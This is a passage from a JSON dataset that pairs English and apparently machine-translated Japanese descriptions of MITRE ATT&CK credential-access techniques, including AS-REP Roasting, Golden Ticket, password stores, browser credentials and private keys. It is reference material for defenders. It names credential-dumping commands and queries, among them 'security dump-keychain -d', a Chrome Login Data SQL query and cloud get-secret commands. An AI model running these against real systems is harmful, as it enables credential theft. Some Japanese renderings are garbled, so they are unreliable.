                        "description_eng": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                        "description_jp": "攻撃者は、[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002) Kerberos メッセージによって、Kerberos 事前認証を無効にしているアカウントの認証情報を明らかにする可能性がある(引用: Harmj0y Roasting AS-REPs Jan 2017)。\n\n事前認証は、オフラインの[パスワードクラッキング](https://attack.mitre.org/techniques/T1110/002)に対する保護を提供する。有効にすると、リソースへのアクセスを要求するユーザーは、パスワードのハッシュで暗号化されたタイムスタンプ付きの認証サーバー要求（AS-REQ）メッセージを送信することで、ドメインコントローラー（DC）との通信を開始する。DCがユーザーのパスワードのハッシュでタイムスタンプの復号化に成功した場合のみ、DCはユーザーにチケット付与チケット（TGT）を含む認証サーバー応答（AS-REP）メッセージを送信する。AS-REPメッセージの一部は、ユーザーのパスワードで署名される(引用：Microsoft Kerberos Preauth 2014)\n\n事前認証なしで発見された各アカウントについて、敵対者は暗号化されたタイムスタンプなしでAS-REQメッセージを送信し、RC4などの安全でないアルゴリズムで暗号化されている可能性のあるTGTデータを含むAS-REPメッセージを受信する可能性があります。復元された暗号化されたデータは、[Kerberoasting](https://attack.mitre.org/techniques/T1558/003)と同様にオフラインの[Password Cracking](https://attack.mitre.org/techniques/T1110/002)攻撃に対して脆弱であり、平文の認証情報を暴露する可能性がある。(引用：Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\n特別な権限の有無にかかわらず、ドメインに登録されたアカウントを悪用して、[PowerShell](https://attack.mitre.org/techniques/T1059/001)のようなWindowsツールをLDAPフィルタとともに利用することで、事前認証が無効になっているすべてのドメインアカウントをリストアップすることができる。あるいは、敵対者は各ユーザにAS-REQメッセージを送信することもできる。DC がエラーなしで応答した場合、そのアカウントは事前認証を必要とせず、AS-REP メッセージにはすでに暗号化されたデータが含まれている。(引用：Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nクラックされたハッシュは、[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスを通じて、[永続性](https://attack.mitre.org/tactics/TA0003)、[特権のエスカレーション](https://attack.mitre.org/tactics/TA0004)、[横移動](https://attack.mitre.org/tactics/TA0008)を可能にする可能性がある(引用: SANS Attacking Kerberos Nov 2014)"
                    },
                    {
                        "id": "T1558.001",
                        "name_eng": "Golden Ticket",
                        "name_jp": "ゴールデン・チケット",
                        "description_eng": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.",
                        "description_jp": "KRBTGTアカウントパスワードハッシュを持つ敵対者は、ゴールデンチケットとしても知られるKerberosチケット付与チケット(TGT)を偽造することができる(引用：AdSecurity Kerberos GT Aug 2015) ゴールデンチケットは、敵対者がActive Directoryのあらゆるアカウントの認証材料を生成することを可能にする(引用：CERT-EU Golden Ticket Protection)\n\nゴールデンチケットを使用すると、敵対者は特定のリソースへのアクセスを可能にするチケット付与サービス（TGS）チケットを要求できるようになります。ゴールデンチケットは、敵対者がTGSを取得するために鍵配布センター(KDC)と対話することを必要とする(引用：ADSecurity Detecting Forged Tickets)\n\nKDCサービスは、Active Directoryドメインの一部であるドメイン・コントローラー上ですべて実行される。KRBTGTはKerberos Key Distribution Center (KDC)サービスアカウントであり、すべてのKerberosチケットの暗号化と署名を担当する(引用：ADSecurity Kerberos and KRBTGT)。KRBTGTパスワードハッシュは、[OS Credential Dumping](https://attack.mitre.org/techniques/T1003)とドメインコントローラへの特権アクセスを使用して取得できる。"
                    }
                ]
            },
            {
                "id": "T1555",
                "name_eng": "Credentials from Password Stores",
                "name_jp": "パスワードストアからのクレデンシャル",
                "description_eng": "Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
                "description_jp": "攻撃者は、ユーザのクレデンシャルを入手するために、パスワードの一般的な保存場所を探索する可能性がある。 引用：F-Secure The Dukes） パスワードは、クレデンシャルを保持するオペレーティングシステムやアプリケーションに応じて、システム上のいくつかの場所に保存される。また、パスワード・マネージャやクラウド秘密保管庫など、ユーザがパスワードを管理・維持しやすくするためにパスワードを保管する特定のアプリケーションやサービスもある。いったんクレデンシャルを取得すると、それを使って横の動きを実行し、制限された情報にアクセスすることができる。",
                "subtechniques": [
                    {
                        "id": "T1555.004",
                        "name_eng": "Windows Credential Manager",
                        "name_jp": "Windowsクレデンシャルマネージャ",
                        "description_eng": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)",
                        "description_jp": "攻撃者は Windows クレデンシャルマネージャからクレデンシャルを取得する可能性がある。クレデンシャルマネージャは、NTLM または Kerberos による認証を要求する Web サイト、アプリケーション、および/またはデバイスにサインインするためのクレデンシャルをクレデンシャルロッカ(以前は Windows Vaults と呼ばれていた)に格納する。 (引用: Microsoft Credential Manager store)(引用: Microsoft Credential Locker)\n\nWindows クレデンシャルマネージャは、2 つのロッカーで Web サイトのクレデンシャルとアプリケーションまたはネットワークのクレデンシャルを分離する。Web ブラウザからのクレデンシャル](https://attack.mitre.org/techniques/T1555/003) の一部として、Internet Explorer と Microsoft Edge の Web サイトクレデンシャルはクレデンシャルマネージャによって管理され、Web クレデンシャルロッカに格納されます。アプリケーションおよびネットワークのクレデンシャルは、Windows クレデンシャルロッカーに格納されます。\n\n資格情報ロッカーは、`%Systemdrive%Users[Username]﹑AppData﹑ Local﹑Microsoft﹑[Vault/Credentials]﹑の下にある暗号化された `.vcrd` ファイルに資格情報を格納する。暗号化キーは、<code>Policy.vpol</code>という名前のファイルにあり、通常は資格情報と同じフォルダにあります。\n\n攻撃者は、Windows Credential Manager が管理するクレデンシャルをいくつかのメカニズムでリストすることができます。<code>vaultcmd.exe</code>は Windows ネイティブの実行可能ファイルであり、コマンドライン インターフェイスを介してクレデンシャル ロッカーに格納されているクレデンシャルを列挙するために使用できます。攻撃者は、クレデンシャルロッカー内のファイルを直接読み取ってクレデンシャルを収集することもできます。また、<code>CredEnumerateA</code> などの Windows API を使用して、クレデンシャルマネージャが管理するクレデンシャルをリストすることもできる。 (引用: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\n攻撃者はクレデンシャルのバックアップからクレデンシャルを取得することもできる。クレデンシャルのバックアップと復元は、<code>rundll32.exe keymgr.dll KRShowKeyMgr</code> を実行し、[Stored User Names and Passwords] GUI で [Back up...] ボタンを選択することで実行できる。\n\nパスワード回復ツールは、クレデンシャルマネージャからプレーンテキストのパスワードを取得することもできます。 (引用: Malwarebytes The Windows Vault)"
                    },
                    {
                        "id": "T1555.001",
                        "name_eng": "Keychain",
                        "name_jp": "キーホルダー",
                        "description_eng": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)",
                        "description_jp": "攻撃者は Keychain からクレデンシャルを取得する可能性がある。Keychain（またはKeychain Services）はmacOSのクレデンシャル管理システムで、アカウント名、パスワード、秘密鍵、証明書、機密アプリケーションデータ、支払いデータ、セキュアノートを保存する。キーチェーンには3つのタイプがあります：ログインキーチェーン、システムキーチェーン、ローカルアイテム（iCloud）キーチェーンです。デフォルトのキーチェーンはログインキーチェーンで、ユーザーのパスワードと情報を保存します。システムキーチェーンには、ホスト上のユーザー間で共有されるアイテムなど、オペレーティングシステムからアクセスされるアイテムが保存されます。ローカルアイテム（iCloud）キーチェーンは、AppleのiCloudサービスと同期されたアイテムに使用されます。\n\nキーチェーンは、Keychain Accessアプリケーションまたはコマンドラインユーティリティ<code>security</code>を使用して表示および編集できます。キーチェーンファイルは、<code>~/Library/Keychains/</code>、<code>/Library/Keychains/</code>、<code>/Network/Library/Keychains/</code>にあります。(引用：キーチェーンサービスApple)(引用：キーチェーン復号パスウェア)(引用：OSX Keychain Schaumann)\n\n攻撃者はKeychainストレージ/メモリからユーザー認証情報を収集する可能性があります。例えば、<code>security dump-keychain -d</code>コマンドは、<code>~/Library/Keychains/login.keychain-db</code>からすべてのLogin Keychain認証情報をダンプします。攻撃者は、<code>~/Library/Keychains/login.keychain</code>ファイルから直接Login Keychain認証情報を読み取ることもできます。どちらの方法もパスワードが必要で、Login Keychainのデフォルトのパスワードは、macOSホストにログインするための現在のユーザーのパスワードである。(引用：External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)"
                    },
                    {
                        "id": "T1555.005",
                        "name_eng": "Password Managers",
                        "name_jp": "パスワード管理",
                        "description_eng": "Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)",
                        "description_jp": "攻撃者は、サードパーティのパスワードマネージャからユーザー認証情報を取得する可能性がある。 引用：ise Password Manager February 2019） パスワードマネージャは、通常暗号化されたデータベースにユーザー認証情報を保存するように設計されたアプリケーションである。認証情報は通常、ユーザがデータベースのロックを解除するマスターパスワードを提供した後にアクセスできる。データベースのロックが解除された後、これらのクレデンシャルはメモリにコピーすることができる。これらのデータベースは、ディスク上のファイルとして保存することができる(引用：ise Password Manager 2019年2月号)\n\n攻撃者は、マスターパスワードおよび/または平文の認証情報をメモリから抽出することによって、パスワードマネージャからユーザー認証情報を取得する可能性があります(引用: FoxIT Wocao 2019年12月)(引用: Github KeeThief) 攻撃者は、[Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)を介してメモリから認証情報を抽出する可能性があります(引用: NVD CVE-2019-3610)。\n また、パスワードマネージャのマスターパスワードを取得するために、[Password Guessing](https://attack.mitre.org/techniques/T1110/001)を介してブルートフォース(総当たり)を試みる可能性もある。(引用：Cyberreason Anchor 2019年12月号)"
                    },
                    {
                        "id": "T1555.006",
                        "name_eng": "Cloud Secrets Management Stores",
                        "name_jp": "クラウド秘密管理ストア",
                        "description_eng": "Adversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment – for example, by obtaining the credentials of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004) or compromising a service that has permission to retrieve secrets – they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered Spider 2023)(Citation: Sysdig ScarletEel 2.0 2023)(Citation: AWS Secrets Manager)(Citation: Google Cloud Secrets)(Citation: Microsoft Azure Key Vault)\n\n**Note:** this technique is distinct from [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005) in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
                        "description_jp": "攻撃者は、AWS Secrets Manager、GCP Secret Manager、Azure Key Vault、Terraform Vaultなどのクラウドネイティブな秘密管理ソリューションから認証情報を取得する可能性がある。  \n\nシークレットマネージャーは、パスワード、APIキー、およびその他のクレデンシャルの安全な集中管理をサポートする。シークレットマネージャーが使用されている場合、クラウドサービスは、プレーンテキストファイルや環境変数に安全に保存されたシークレットにアクセスするのではなく、APIリクエストを介して動的にクレデンシャルを取得することができる。  \n\n敵対者がクラウド環境で十分な特権を得ることができた場合、例えば高特権の[Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)のクレデンシャルを取得したり、シークレットを取得する権限を持っているサービスを侵害したりすることで、シークレットマネージャにシークレットを要求することができるかもしれない。これは、AWSでは`get-secret-value`、GCPでは`gcloud secrets describe`、Azureでは`az key vault secret show`といったコマンドで実現できる。(引用：Permiso Scattered Spider 2023)(引用：Sysdig ScarletEel 2.0 2023)(引用：AWS Secrets Manager)(引用：Google Cloud Secrets)(引用：Microsoft Azure Key Vault)\n\n**注意:**このテクニックは、インスタンスメタデータAPIという媒体を通してではなく、クラウドシークレットマネージャーから直接認証情報を要求するという点で、[Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)とは異なる。"
                    },
                    {
                        "id": "T1555.003",
                        "name_eng": "Credentials from Web Browsers",
                        "name_jp": "ウェブブラウザからの認証情報",
                        "description_eng": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
                        "description_jp": "攻撃者は、ターゲットとなるブラウザに固有のファイルを読み取ることで、ウェブブラウザから認証情報を取得する可能性があります。(引用: Talos Olympic Destroyer 2018) ウェブブラウザは一般的に、ウェブサイトのユーザー名やパスワードなどの認証情報を保存し、将来手動で入力する必要がないようにします。ウェブブラウザは通常、クレデンシャルストア内に暗号化された形式でクレデンシャルを保存しますが、ウェブブラウザから平文のクレデンシャルを抽出する方法も存在します。\n\n例えば、Windowsシステムでは、データベースファイル<code>AppDataLocal\\GoogleChrome\\User Data</code> を読み取り、SQLクエリを実行することで、暗号化された認証情報をGoogle Chromeから取得できます：<code>SELECT action_url, username_value, password_value FROM logins;</code>。平文のパスワードは、暗号化された認証情報を Windows API 関数 <code>CryptUnprotectData</code> に渡すことで取得できます。\n \nAdversariesは、FireFox、Safari、Edgeなどの一般的なWebブラウザに対しても同様の手順を実行しています(引用: Proofpoint Vega Credential Stealer 2018年5月)(引用: FireEye HawkEye Malware 2017年7月) Windowsは、Internet ExplorerとMicrosoft Edgeの認証情報を[Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004)が管理するCredential Lockersに保存します。\n\nまた、ウェブブラウザのプロセスメモリを検索し、一般的にクレデンシャルと一致するパターンを検索することで、攻撃者がクレデンシャルを取得することもあります(引用: GitHub Mimikittenz July 2016)\n\nウェブブラウザから認証情報を取得した後、敵対者はアクセスを拡大するために、異なるシステムやアカウント間で認証情報を再利用しようとする可能性があります。これは、ウェブブラウザから得た認証情報が特権アカウント（例えばドメイン管理者）と重複している場合に、敵の目的を著しく推進する結果となり得る。"
                    },
                    {
                        "id": "T1555.002",
                        "name_eng": "Securityd Memory",
                        "name_jp": "セキュリティー・メモリー",
                        "description_eng": "An adversary with root access may gather credentials by reading `securityd`’s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple’s `securityd` utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
                        "description_jp": "rootアクセス権を持つ敵対者は、`securityd`のメモリを読み取ることで認証情報を収集することができる。(Citation: Apple Dev SecurityD) 特権を持った敵対者は `securityd` のメモリをスキャンして、ユーザのログオンキーチェインを解読するための正しい鍵のシーケンスを見つけることができるかもしれません。これにより、ユーザー、WiFi、メール、ブラウザ、証明書、セキュアノートなど、さまざまな平文のパスワードが敵対者に提供される可能性がある(引用: OS X Keychain)(Citation: OSX Keydnap malware)\n\nEl Capitan以前のOS Xでは、rootアクセス権を持つユーザーは、ログインしているユーザーのプレーンテキストのキーチェーンパスワードを読むことができる。(引用：OS X Keychain)(引用：External to DA, the OS X Way) Appleの`securityd`ユーティリティは、ユーザーのログオンパスワードを取得し、PBKDF2で暗号化し、このマスターキーをメモリに保存する。Appleはまた、ユーザーのパスワードを暗号化するために一連のキーとアルゴリズムを使用するが、一度マスターキーが見つかれば、敵は最終的なパスワードを解除するために他の値を反復するだけでよい(引用：OS X Keychain)"
                    }
                ]
            },
            {
                "id": "T1552",
                "name_eng": "Unsecured Credentials",
                "name_jp": "無担保クレデンシャル",
                "description_eng": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)",
                "description_jp": "攻撃者は侵害されたシステムを検索して、安全に保存されていないクレデンシャルを見つけ、入手することができる。これらの認証情報は、プレーンテキストファイル（[Bash History](https://attack.mitre.org/techniques/T1552/003)など）、オペレーティングシステムやアプリケーション固有のリポジトリ（[Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)など）、その他の特殊なファイル/アーティファクト（[Private Keys](https://attack.mitre.org/techniques/T1552/004)など）など、システム上のさまざまな場所に保存されたり、誤って配置されたりする可能性がある（引用：Bringing MimiKatz to Unix）。",
                "subtechniques": [
                    {
                        "id": "T1552.006",
                        "name_eng": "Group Policy Preferences",
                        "name_jp": "グループポリシーの環境設定",
                        "description_eng": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>",
                        "description_jp": "攻撃者はグループポリシー環境設定(GPP)で安全でない認証情報を見つけようとするかもしれない。GPP は、管理者が認証情報を埋め込んだドメインポリシーを作成できるようにするツールです。これらのポリシーにより、管理者はローカルアカウントを設定することができます。(引用：Microsoft GPP 2016)\n\nこれらのグループポリシーはドメインコントローラー上のSYSVOLに保存される。これは、ドメインユーザーであれば誰でもSYSVOL共有を閲覧し、パスワードを復号化できることを意味する(公開されているAESキーを使用)(引用: Microsoft GPP Key)\n\n以下のツールとスクリプトを使用して、グループポリシー設定XMLファイルからパスワードファイルを収集し、復号化することができる：\n\n* Metasploit の post exploitation モジュール：<code>post/windows/gather/credentials/gpp</code>。\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nSYSVOL共有上で、敵対者は以下のコマンドを使って潜在的なGPP XMLファイルを列挙することができます：<code>dir /s * .xml</code>."
                    },
                    {
                        "id": "T1552.004",
                        "name_eng": "Private Keys",
                        "name_jp": "プライベート・キー",
                        "description_eng": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",
                        "description_jp": "攻撃者は、危殆化したシステム上の秘密鍵証明書ファイルを検索して、安全に保存されていない証明書を探すことがある。秘密鍵および証明書は、認証、暗号化/復号化、およびデジタル署名に使用される。 (引用: Wikipedia Public Key Crypto) 一般的な鍵および証明書のファイル拡張子には、以下のものがある：.key、.pgp、.gpg、.ppk、.p12、.pem、.pfx、.cer、.p7b、.asc。\n\n攻撃者はまた、一般的な鍵ディレクトリ、例えば* nixベースのシステムではSSH鍵の<code>~/.ssh</code>、Windowsでは<code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code>を探すかもしれない。攻撃ツールはまた、暗号鍵や証明書に関連するファイル拡張子を侵害されたシステムで検索する可能性があります。(引用：Kaspersky Careto)(引用：Palo Alto Prince of Persia)\n\nデバイスが Entra ID に登録されると、デバイス鍵とトランスポート鍵が生成され、デバイスの ID を検証するために使用されます（引用：Microsoft Primary Refresh Token）。デバイスにアクセスできる敵対者は、デバイスになりすますために鍵をエクスポートできる可能性があります（引用：AADInternals Azure AD Device Identities）。\n\nネットワークデバイスでは、`crypto pki export`などの[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して秘密鍵をエクスポートできる。(引用：cisco_deploy_rsa_keys)\n\n一部の秘密鍵は操作にパスワードまたはパスフレーズを必要とするため、敵は[Input Capture](https://attack.mitre.org/techniques/T1056)を使用してキーロギングを行ったり、[Brute Force](https://attack.mitre.org/techniques/T1110)を使用してオフラインでパスフレーズを試すこともできる。これらの秘密鍵は、SSHのような[リモートサービス](https://attack.mitre.org/techniques/T1021)への認証や、電子メールのような他の収集されたファイルの復号化に使用することができる。"
                    },
                    {
                        "id": "T1552.007",
                        "name_eng": "Container API",
                        "name_jp": "コンテナAPI",
                        "description_eng": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
